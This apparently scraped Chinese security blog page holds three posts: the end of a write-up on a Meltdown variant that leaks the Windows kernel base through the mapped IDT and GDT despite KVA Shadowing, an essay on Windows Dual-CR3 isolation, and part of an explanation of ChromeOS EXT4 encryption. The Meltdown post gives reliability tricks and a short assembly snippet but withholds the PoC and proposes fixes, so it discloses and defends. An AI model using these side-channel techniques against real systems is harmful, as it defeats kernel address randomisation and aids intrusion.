<p>&emsp;&emsp;言归正传，这个缺陷的原理在于KVA Shadowing虽然不在用户态映射绝大多数内核地址空间，但为了保证应用层、内核层之间能正常切换，依然必须有少量的内核代码与数据映射在用户层的页表中。比如，我们可以看到在补丁生效时的syscall入口KiSystemCall64Shadow并不在.text节里，而是和KiDivideErrorFaultShadow等中断处理入口一起放入了KVASCODE节，该节内容集中放置了CPU状态转换时所需的切换页表的代码，其必须映射在用户态的Shadow address space。同理，KPCR这样的重要数据区也是被映射的。前述代码数据区域虽被映射，但地址是随机的。那么有没有既必须被映射、又能被用户层知晓位置的重要数据呢？不幸的是在目前的设计下存在这样的数据区：IDT与GDT（未使用UMIP时用户层可获取地址）。其中IDT中有各个中断处理函数在前述的KVASCODE节中，可通过meltdown的攻击方法在打完全补丁（包括meltdown/spectre补丁）下直接泄露NT内核模块地址。不过并不是指定内核地址随意使用meltdown攻击就能轻易读出内容，看起来内核地址所存储的数据需要在L1缓存中Meltdown攻击才更有可能成功，因此可以使用prefetch指令去预读，不过实验中找一些实际触碰目标内存的操作成功率会大一些，例如：读取IDT内容前故意触发一个中断，读取GDT前如下修改段寄存器内容使CPU访问GDT数据填入段寄存器的影子寄存器:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax, es</span><br><span class="line">push rax</span><br><span class="line">mov ax, fs</span><br><span class="line">mov es, ax ; Let cpu touch GDT.</span><br><span class="line">pop rax</span><br><span class="line">mov es, ax</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;实验中IDT内容的读取相对不那么稳定，不过通过阈值的调整在笔者多台机器上可正确获取NT内核模块地址。PoC代码就不贴出了，简单原理已经说清楚了，附图中是读取IDT（中断处理函数）。</p>
<p>&emsp;&emsp;要修补该缺陷也很简单，对支持UMIP（User-Mode Instruction Prevention）的CPU可直接使用该特性；更通用的方案则是将中断处理入口改为随机化地址同时又映射在user shadow address space的代码片段中，该段代码切换页表后跳转至nt内核中实际处理函数（为防止理论上攻击者可读取该段代码内容分析出跳转目标地址，可使最后跳转指令在未被映射到user的页面上，或者读取未被映射到user的数据区中的内容间接跳转）。<br><img src="/2018/02/06/meltdown/1.png" alt>  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/02/06/meltdown/" data-id="cmd5slr27000b0lo19rnsgjps" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2017/12/rs4_dual_cr3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="../../2017/12/rs4_dual_cr3/" class="article-date">
  <time datetime="2017-12-05T18:06:40.000Z" itemprop="datePublished">2017-12-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="../../2017/12/rs4_dual_cr3/">随笔</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : https://weibo.com/jfpan</p>
<p>&emsp;&emsp;这是一篇随笔，Win10对虚拟化实施拦截的产品设的障碍越来越大，忍不住吐槽下。话说RS3改进PatchGuard的针对性很明显，但为什么昨天提到Dual-CR3呢？因为它虽对功能实现没什么影响，但对性能造成不小麻烦（实际上，虚拟化拦截类项目，其拦截功能本身的实现是非常简单的，而能否大规模产品化、商业化的根本核心难点与重点在于完美兼容性与极高实时性能的要求：1、兼容性——除去极端软件，即“用我时就别运行其他虚拟化或硬件相关程序”的软件——必须实现对GUEST展现实际CPU全部硬件特性且GUEST确实可使用这些特性，否则在一些场景一定有兼容问题。兼容性的一些入门测试有不少，比如虚拟化功能开启时运行vmware workstation在里面各跑一个32bit Guest和64bit Guest、跑一个Bluestacks模拟器玩玩Android游戏、给Intel CPU打一个微码补丁等等；2、性能的要求是几乎不造成性能下降，而#VMEXIT的性能损耗是巨大的，因此至少需要实现未嵌套工作时在支持unrestricted guest的CPU上几乎不产生#VMEXIT。这两点可探讨的细节和实例太多，就不写了，一个小广告——可参考360HVM）。       </p>
<p>&emsp;&emsp;那么微软为什么要在RS4引入Dual-CR3，这要从内核地址空间随机化（KASLR）说起了，Win10 KASLR随机化了模块的加载基址、内核对象地址、页表地址等，缓解了内核漏洞的利用。不过之前微软对各种基于硬件的边信道攻击（double page fault、prefetch side-channel、TSX-based side-channel等等）依然是没有防护的，这次引入Dual-CR3至少目标中包含增加该种防护。学术圈对该类攻击和防御手段研究已经多时了，今年《KASLR is Dead: Long Live KASLR》这篇论文为Linux设计实现的内核地址隔离方案KAISER号称性能损失仅有0.28%，当初看到的时候只凭感觉每次系统调用都切换CR3、把非Global的TLB项清除（何况为了实现内核地址强隔离应该是没有Global项），这性能损失怎么会这么小（论文里倒是提供了一下解释：首先Global没什么用”Surprisingly, we found the performance impact of disabling global bits to be entirely negligible”；其次现代CPU对TLB管理的优化使得频繁切CR3也没什么大损失了）。没想到没几个月微软就直接在Win10上完全照搬了这套方案（不是每个进程都切换）。这套方案原理简单可行，参见附图一（论文附图）就一目了然了。微软在进程—_KPROCESS中增加了UserDirectoryTableBase配合原有DirectoryTableBase即提供论文中描述的CR3 Pair的内容。线程运行时，_KPRCB中的KernelDirectoryTableBase、RspBaseShadow、UserRspShadow、ShadowFlags用于模式转换时的隔离切换，需要加入的代码很少，附图二是Intel CPU的系统调用入口的代码，返回时自然也有相应的处理。       </p>
<p>&emsp;&emsp;回到一开始，微软的强隔离对虚拟化拦截项目有什么影响呢？首先对一些拦截了MOV-CR3操作的情况乐子就大了，增加大量的#VMEXIT；其次微软仅保留映射了极少的内核页面在所谓Shadow address space中，比如KiSystemCall64Shadow需要被映射，但KiSystemCall64- KiSystemServiceUser都未被映射，更别说虚拟机在GUEST中的HOOK代码了。如果强制在GUEST中映射自己的代码，这相当不优美又对强隔离有所破坏且带来风险。有事要忙随笔先写到这里。       </p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>https://cmaurice.fr/pdf/essos17_gruss.pdf</p>
<h2 id="附图1"><a href="#附图1" class="headerlink" title="附图1"></a>附图1</h2><p><img src="/2017/12/rs4_dual_cr3/1.jpg" alt>   </p>
<h2 id="附图2"><a href="#附图2" class="headerlink" title="附图2"></a>附图2</h2><p><img src="/2017/12/rs4_dual_cr3/2.jpg" alt>   </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2017/12/rs4_dual_cr3/" data-id="cmd5slqzy00060lo12dps90ka" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2017/10/ChromeOS-Userdata-Protection-Mechanism-Based-On-EXT4-Encryption" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="../../2017/10/ChromeOS-Userdata-Protection-Mechanism-Based-On-EXT4-Encryption/" class="article-date">
  <time datetime="2017-10-30T00:00:00.000Z" itemprop="datePublished">2017-10-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="../../2017/10/ChromeOS-Userdata-Protection-Mechanism-Based-On-EXT4-Encryption/">Chrome OS基于EXT4 Encryption的用户数据安全保护机制</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : <a href="http://weibo.com/suezi86" target="_blank">suezi(@suezi86)</a> of IceSword Lab , Qihoo 360</p>
<hr>
<p><span id="top"></span></p>
<ul>
<li><a href="#overview">概述</a></li>
<li><a href="#EXT4-Encryption-brief">EXT4 Encryption简述</a></li>
<li><a href="#EXT4-Encryption-detail">EXT4 Encryption详述</a><ul>
<li><a href="#EXT4-Encryption-datastruct">EXT4 Encryption的主要数据结构</a></li>
<li><a href="#Enable-EXT4-Encryption">使能EXT4 Encryption</a></li>
<li><a href="#Add-Master-Key">添加master key的流程</a></li>
<li><a href="#Set-Encryption-Policy">Set Encryption Policy流程</a></li>
<li><a href="#EXT4-Encryption-file-creat">creat file流程</a></li>
<li><a href="#EXT4-Encryption-file-open">open file流程</a></li>
<li><a href="#EXT4-Encryption-file-read">read file流程</a></li>
<li><a href="#EXT4-Encryption-file-read">write file流程</a></li>
</ul>
</li>
<li><a href="#end">结语</a></li>
<li><a href="#refer">参考资料</a></li>
</ul>
<h2 id="概述-回页首"><a href="#概述-回页首" class="headerlink" title="概述 回页首"></a>概述 <a href="#top">回页首</a></h2><p><span id="overview"></span></p>
<p>&emsp;  自2015年开发的EXT4 Encryption经过两年的验证性使用，Google终于在年初的时候将EXT4 Encryption 合并入Chrome OS用于保护用户的隐私数据，完成与eCryptfs同样的功能，简称该技术为Dircrypto。当前，Chrome OS仍是eCryptfs和Dircrypto两种技术并存，但优先采用Dircrypto，这表明Dircrypto将成为以后的主流趋势。本文试图阐述该技术的实现原理。<br>&emsp;  与eCryptfs一样，EXT4 Encryption用于完成文件（包括目录）和文件名的加密，以实现多用户系统中各个用户私有数据的安全，即使在设备丢失或被盗的情况下，用户隐私数据也不会轻易被人窥见。本文着重介绍文件内容加解密，文件名加解密留给读者自行研究，技术要点主要包括：加解密模型、密钥管理、EXT4 Encrytion功能的开/关及参数设定操作。</p>
<h2 id="EXT4-Encryption-简述-回页首"><a href="#EXT4-Encryption-简述-回页首" class="headerlink" title="EXT4 Encryption 简述 回页首"></a>EXT4 Encryption 简述 <a href="#top">回页首</a></h2><p><span id="EXT4-Encryption-brief"></span></p>
<p>&emsp;  创立eCryptfs十年之后，其主要的作者Michael Halcrow已从之前的IBM转向服务Google。Google在保护用户数据隐私方面具有强烈的需求，应用在其旗下的Android、Chrome OS及数据中心，此时采用的文件系统都是EXT4，eCryptfs属于堆叠在EXT4上的文件系统，性能必定弱于直接在EXT4实现加密，恰好EXT4的主要维护者是Google的Theodore Ts’o ，因此由Michael Halcrow主导、Theodore Ts’o协助开发完成EXT4 Encryption，目标在于“Harder，Better，Faster，Stronger”。<br>&emsp;  相比eCryptfs，EXT4 Encryption在内存使用上有所优化，表现在read page时，直接读入密文到page cache并在该page中解密；而eCryptfs首先需要调用EXT4接口完成读入密文到page cache，然后再解密该page到另外的page cache页，内存花销加倍。当然，write page时，两者都不能直接对当前page cache加密，因为cache的明文内容需要保留着后续使用。在对文件加密的控制策略上，两者都是基于目录，但相比eCryptfs使用的mount方法，EXT4 Encryption采用ioctl的策略显得更加方便和灵活。另外，在密钥管理方面，两者也不相同。<br>&emsp;  EXT4 Encryption加/解密文件的核心思想是：每个用户持有一个64 Bytes的master key，通过master key的描述（master key descriptor，实际使用时一般采用key signature加上”ext4:”前缀）进行识别，每个文件单独产生一个16 Bytes的随机密钥称为nonce，之后以nonce做为密钥，采用AES-128-ECB算法加密master key，产生derived key。加/解密文件时采用AES-256-XTS算法，密钥是derived key。存储文件时，将包含有格式版本、内容加密算法、文件名加密算法、旗标、master key描述、nonce等信息在内的数据保存在文件的xattr扩展属性中。而master key由用户通过一些加密手段进行存储，在激活EXT4 Encryption前通过keys的系统调用以“logon”类型传入内核keyring，即保证master只能被应用程序创建及更新但不能被应用程序读取。加密是基于目录树的形式进行，加密策略通过EXT4_IOC_SET_ENCRYPTION ioctl对某个目录进行下发，其子目录或文件自动继承父目录的属性，ioctl下发的内容包括策略版本号、文件内容加密模式、文件名加密模式、旗标、master key的描述。文件read操作时，从磁盘block中读入密文到page cache并在该page中完成解密，然后拷贝到应用程序；文件write时采用write page的形式写入磁盘，但不是在当前page cache中直接加密，而是将加密后的密文保存在另外的page中。<br>&emsp;  和eCryptfs一样，EXT4 Encryption在技术实现时利用了page cache机制的Buffered I/O,换而言之就是不支持Direct I/O。其加/解密的流程如图一所示。</p>
<center>          
![](ext4-encryption-encrypt-decrypt-flow.png "图一")   
图一 EXT4 Encryption加/解密流程
</center>

<p>图一中，在创建加密文件时通过get_random_bytes函数产生16 Bytes的随机数，将其做为nonce保存到文件的xattr属性中；当打开文件时取出文件的nonce和master key的描述，通过master key描述匹配到应用程序下发的master key；然后以nonce做为密钥，采用AES-128-ECB算法加密master key后产生derived key，加/解密文件时采用该derived key做为密钥，加密算法由用户通过ioctl下发并保存到xattr的”contents_encryption_mode”字段，目前版本仅支持AES-256-XTS；加/解密文件内容时调用kernel crypto API完成具体的加/解密功能。<br>&emsp;  下面分别从EXT4 Encryption使用的数据结构、内核使能EXT4 Encryption功能、如何添加master key到keyring、如何开启EXT4 Encryption功能、创建和打开加密文件、读取和解密文件、加密和写入加密文件等方面详细叙述。</p>
<h2 id="EXT4-Encryption详述-回页首"><a href="#EXT4-Encryption详述-回页首" class="headerlink" title="EXT4 Encryption详述 回页首"></a>EXT4 Encryption详述 <a href="#top">回页首</a></h2><p><span id="EXT4-Encryption-detail"></span></p>
<h3 id="EXT4-Encryption的主要数据结构-回页首"><a href="#EXT4-Encryption的主要数据结构-回页首" class="headerlink" title="EXT4 Encryption的主要数据结构 回页首"></a>EXT4 Encryption的主要数据结构 <a href="#top">回页首</a></h3><p><span id="EXT4-Encryption-datastruct"></span></p>
<p>&emsp;  通过数据结构我们可以窥视到EXT4 Encryption的密钥信息的保存和使用方式，非常有利于理解该加密技术。涉及到主要数据结构如下：<br>&emsp;  master key的payload的数据表示如清单一所示，应用程序通过add_key系统调用将其和master key descriptor传入内核keyring。</p>
<h4 id="清单一-master-key"><a href="#清单一-master-key" class="headerlink" title="清单一 master key"></a>清单一 master key</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is passed in from userspace into the kernel keyring */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext4_encryption_key</span> &#123;</span></span><br><span class="line">        __u32 mode;</span><br><span class="line">        <span class="keyword">char</span> raw[EXT4_MAX_KEY_SIZE];</span><br><span class="line">        __u32 <span class="built_in">size</span>;</span><br><span class="line">&#125; __attribute__((__packed__));</span><br></pre></td></tr></table></figure>

<p>&emsp;  EXT4 Encryption的文件加密信息的数据存储结构如清单二结构体struct ext4_encryption_context所示，每个文件都对应保存着这样的一个数据结构在其xattr中，包含了加密版本、文件内容和文件名的加密算法、旗标、master key descriptor和随机密钥nonce。</p>
<h4 id="清单二-加密信息存储格式"><a href="#清单二-加密信息存储格式" class="headerlink" title="清单二 加密信息存储格式"></a>清单二 加密信息存储格式</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Encryption context for inode</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Protector format:</span></span><br><span class="line"><span class="comment"> *  1 byte: Protector format (1 = this version)</span></span><br><span class="line"><span class="comment"> *  1 byte: File contents encryption mode</span></span><br><span class="line"><span class="comment"> *  1 byte: File names encryption mode</span></span><br><span class="line"><span class="comment"> *  1 byte: Reserved</span></span><br><span class="line"><span class="comment"> *  8 bytes: Master Key descriptor</span></span><br><span class="line"><span class="comment"> *  16 bytes: Encryption Key derivation nonce</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext4_encryption_context</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> format;</span><br><span class="line">	<span class="keyword">char</span> contents_encryption_mode;</span><br><span class="line">	<span class="keyword">char</span> filenames_encryption_mode;</span><br><span class="line">	<span class="keyword">char</span> flags;</span><br><span class="line">	<span class="keyword">char</span> master_key_descriptor[EXT4_KEY_DESCRIPTOR_SIZE];</span><br><span class="line">	<span class="keyword">char</span> nonce[EXT4_KEY_DERIVATION_NONCE_SIZE];</span><br><span class="line">&#125; __attribute__((__packed__));</span><br></pre></td></tr></table></figure>

<p>&emsp;  设置EXT4 Encryption开启是通过对特定目录进行EXT4_IOC_SET_ENCRYPTION ioctl完成，具体策略使用清单三所示的struct ext4_encryption_policy 数据结构进行封装，包括版本号、文件内容的加密算法、文件名的加密算法、旗标、master key descriptor。每个加密文件保存的ext4_encryption_context信息均继承自该数据结构，子目录继承父目录的ext4_encryption_context。</p>
<h4 id="清单三-Encryption-policy"><a href="#清单三-Encryption-policy" class="headerlink" title="清单三 Encryption policy"></a>清单三 Encryption policy</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Policy provided via an ioctl on the topmost directory */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext4_encryption_policy</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> version;</span><br><span class="line">	<span class="keyword">char</span> contents_encryption_mode;</span><br><span class="line">	<span class="keyword">char</span> filenames_encryption_mode;</span><br><span class="line">	<span class="keyword">char</span> flags;</span><br><span class="line">	<span class="keyword">char</span> master_key_descriptor[EXT4_KEY_DESCRIPTOR_SIZE];</span><br><span class="line">&#125; __attribute__((__packed__));</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<p>&emsp;  open文件时将文件加密相关信息从xattr中读出并保存在清单四的struct ext4_crypt_info数据结构中，成员ci_ctfm用于调用kernel crypto，在文件open时做好key的初始化。从磁盘获取到加密信息后，将该数据结构保存到inode的内存表示struct ext4_inode_info中的i_crypt_info字段，方便后续的readpage、writepage时获取到相应数据进行加/解密操作。</p>
<h4 id="清单四-保存加-解密信息及调用接口的数据结构"><a href="#清单四-保存加-解密信息及调用接口的数据结构" class="headerlink" title="清单四 保存加/解密信息及调用接口的数据结构"></a>清单四 保存加/解密信息及调用接口的数据结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext4_crypt_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span>		ci_data_mode;</span><br><span class="line">	<span class="keyword">char</span>		ci_filename_mode;</span><br><span class="line">	<span class="keyword">char</span>		ci_flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">crypto_ablkcipher</span> *<span class="title">ci_ctfm</span>;</span></span><br><span class="line">	<span class="keyword">char</span>		ci_master_key[EXT4_KEY_DESCRIPTOR_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<p>&emsp;  如清单五所示，采用struct ext4_crypto_ctx 表示在readpage、writepage时进行page加/解密的context。在writepage时因为涉及到cache机制，需要保存明文页，所以专门申请单独的bounce_page保存密文用于写入磁盘，用control_page来指向正常的明文页。在readpage时，通过bio从磁盘中读出数据到内存页，读页完成后通过queue_work的形式调用解密流程并将明文保存在当前页，因此context中存在work成员。另外，为了提高效率，在初始化阶段一次性申请了128个ext4_crypto_ctx的内存空间并通过free_list链表进行管理。</p>
<h4 id="清单五-用于表示加-解密page的context"><a href="#清单五-用于表示加-解密page的context" class="headerlink" title="清单五 用于表示加/解密page的context"></a>清单五 用于表示加/解密page的context</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext4_crypto_ctx</span> &#123;</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">bounce_page</span>;</span>       <span class="comment">/* Ciphertext page */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">control_page</span>;</span>      <span class="comment">/* Original page  */</span></span><br><span class="line">		&#125; w;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">bio</span> *<span class="title">bio</span>;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">		&#125; r;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">free_list</span>;</span>     <span class="comment">/* Free list */</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">char</span> flags;                      <span class="comment">/* Flags */</span></span><br><span class="line">	<span class="keyword">char</span> mode;                       <span class="comment">/* Encryption mode for tfm */</span></span><br><span class="line">&#125;;</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<h3 id="使能EXT4-Encryption-回页首"><a href="#使能EXT4-Encryption-回页首" class="headerlink" title="使能EXT4 Encryption 回页首"></a>使能EXT4 Encryption <a href="#top">回页首</a></h3><p><span id="Enable-EXT4-Encryption"></span></p>
<p>&emsp;  Linux kernel具有良好的模块化设计，EXT4 Encryption属于一个EXT4 FS中一个可选的模块，在编译kernel前需通过配置选项使能该功能，如下：<br>CONFIG_EXT4_FS_SECURITY=y<br>CONFIG_EXT4_FS_ENCRYPTION=y</p>
<h3 id="添加master-key的流程-回页首"><a href="#添加master-key的流程-回页首" class="headerlink" title="添加master key的流程 回页首"></a>添加master key的流程 <a href="#top">回页首</a></h3><p><span id="Add-Master-Key"></span></p>
<p>&emsp;  将master key添加到内核keyring属于EXT4 Encryption的第一步，该步骤通过add_key系统调用完成，master key在不同的Linux发行版有不同的产生及保存方法，这里以Chrome OS为例。<br>&emsp;  Chrome OS在cryptohomed守护进程中完成master key的获取和添加到keyring。因为兼容eCryptfs和EXT4 Encryption（为了跟Chrome OS保持一致，后续以Dircrypto代替EXT4 Encryption的称呼），而eCryptfs属于前辈，eCryptfs通过mount的方式完成加密文件的开启，为了保持一致性，cryptohomed同样是在mount的准备过程中解密出master key和开启Dircrypto，此master key即eCryptfs加密模式时用的FEK，master key descriptor即FEK的key signature，所以本节介绍Dircrypto流程时所谓的mount流程，望读者能够理解，在Dircrypto模式下，mount不是真正“mount”，千万不要混淆。cryptohomed的mount流程如下：    </p>
<ol>
<li>cryptohomed在D-Bus上接收到持（包含用户名和密码）有效用户证书的mount请求，当然D-Bus请求也是有权限控制的；    </li>
<li>假如是用户首次登陆，将进行：<br>a．    建立/home/.shadow/[salt_hash_of_username]目录，采用SHA1算法和系统的salt对用户名进行加密，生成salt_hash_of_username，简称s_h_o_u;<br>b．    生成vault keyset /home/.shadow/[salt_hash_of_username]/master.0和/home/.shadow/[salt_hash_of_username]/master.0.sum。master.0加密存储了包含有FEK和FNEK的内容以及非敏感信息如salt、password rounds等；master.0.sum是对master.0文件内容的校验和。    </li>
<li>采用通过mount请求传入的用户证书解密keyset。当TPM可用时优先采用TPM解密，否则采用Scrypt库，当TPM可用后再自动切换回使用TPM。cryptohome使用TPM仅仅是为了存储密钥，由TPM封存的密钥仅能被TPM自身使用，这可用缓解密钥被暴力破解，增强保护用户隐私数据的安全。TPM的首次初始化由cryptohomed完成。这里默认TPM可正常使用，其解密机制如下图二所示，其中：<br>UP：User Passkey，用户登录口令<br>EVKK：Ecrypted vault keyset key，保存在master.0中的”tpm_key”字段<br>IEVKK：Intermediate vault keyset key，解密过程生成的中间文件，属于EVKK的解密后产物，也是RSA解密的输入密文<br>TPM_CHK: TPM-wrapped system-wide Cryptohome key，保存在/home/.shadow/cryptohome.key，TPM init时加载到TPM<br>VKK：Vault keyset key<br>VK：Vault Keyset，包含FEK和FNEK<br>EVK：Encrypted vault keyset，保存在master.0里”wrapped_keyset”字段</li>
</ol>
<center>          
![](tpm-decrypt-VK.png "图二")   
图二 TPM解密VK的流程
</center>

<p>图二中的UP（由发起mount的D-Bus请求中通过key参数传入）做为一个AES key用于解密EVKK，解密后得到的IEVKK；然后将IEVKK做为RSA的密文送入TPM，使用TPM_CHK做为密钥进行解密，解密后得到VKK；最后生成的VKK是一个AES key，用于解密master.0里的EVK，得到包含有FEK和FNEK明文的VK。经过三层解密，终于拿到关键的FEK，此FEK在Dircrypto模式下当做master key使用，FEK signature即做master key descriptor使用。<br>&emsp;  最后通过add_key系统调用将master key及master key descriptor（在keyring中为了方便区分，master key descriptor由key sign加上前缀”ext4:”组成）添加到keyring，如下清单六代码所示</p>
<h4 id="清单六-Chrome-OS传入master-key的核心代码"><a href="#清单六-Chrome-OS传入master-key的核心代码" class="headerlink" title="清单六 Chrome OS传入master key的核心代码"></a>清单六 Chrome OS传入master key的核心代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">key_serial_t</span> <span class="title">AddKeyToKeyring</span><span class="params">(<span class="keyword">const</span> brillo::SecureBlob&amp; key,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> brillo::SecureBlob&amp; key_descriptor)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//参数中的key即是master key，key_descriptor即sig</span></span><br><span class="line">  <span class="keyword">if</span> (key.<span class="built_in">size</span>() &gt; EXT4_MAX_KEY_SIZE ||</span><br><span class="line">      key_descriptor.<span class="built_in">size</span>() != EXT4_KEY_DESCRIPTOR_SIZE) &#123;</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">"Invalid arguments: key.size() = "</span> &lt;&lt; key.<span class="built_in">size</span>()</span><br><span class="line">               &lt;&lt; <span class="string">"key_descriptor.size() = "</span> &lt;&lt; key_descriptor.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">return</span> kInvalidKeySerial;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//在upstart中已经通过add_key添加dircrypt的会话keyring</span></span><br><span class="line">  <span class="keyword">key_serial_t</span> keyring = keyctl_search(</span><br><span class="line">      KEY_SPEC_SESSION_KEYRING, <span class="string">"keyring"</span>, kKeyringName, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (keyring == kInvalidKeySerial) &#123;</span><br><span class="line">    PLOG(ERROR) &lt;&lt; <span class="string">"keyctl_search failed"</span>;</span><br><span class="line">    <span class="keyword">return</span> kInvalidKeySerial;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//初始化struct ext4_encryption_key</span></span><br><span class="line">  ext4_encryption_key ext4_key = &#123;&#125;;</span><br><span class="line">  ext4_key.mode = EXT4_ENCRYPTION_MODE_AES_256_XTS;</span><br><span class="line">  <span class="built_in">memcpy</span>(ext4_key.raw, key.char_data(), key.<span class="built_in">size</span>());</span><br><span class="line">  ext4_key.<span class="built_in">size</span> = key.<span class="built_in">size</span>();</span><br><span class="line">  <span class="comment">//key_name就是最后的master key description，由”ext4:”+sig两部分组成</span></span><br><span class="line">  <span class="comment">//kernel在request_key时同样是将”ext4:”+sig两部分组成master key description</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> key_name = kKeyNamePrefix + base::ToLowerASCII(</span><br><span class="line">      base::HexEncode(key_descriptor.data(), key_descriptor.<span class="built_in">size</span>()));</span><br><span class="line">  <span class="comment">// kKeyType是“logon”，不允许应用程序获取密钥的内容</span></span><br><span class="line">  <span class="keyword">key_serial_t</span> key_serial = add_key(kKeyType, key_name.c_str(), &amp;ext4_key,</span><br><span class="line">                                    <span class="keyword">sizeof</span>(ext4_key), keyring);</span><br><span class="line">  <span class="keyword">if</span> (key_serial == kInvalidKeySerial) &#123;</span><br><span class="line">    PLOG(ERROR) &lt;&lt; <span class="string">"Failed to insert key into keyring"</span>;</span><br><span class="line">    <span class="keyword">return</span> kInvalidKeySerial;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> key_serial;</span><br><span class="line">&#125;</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

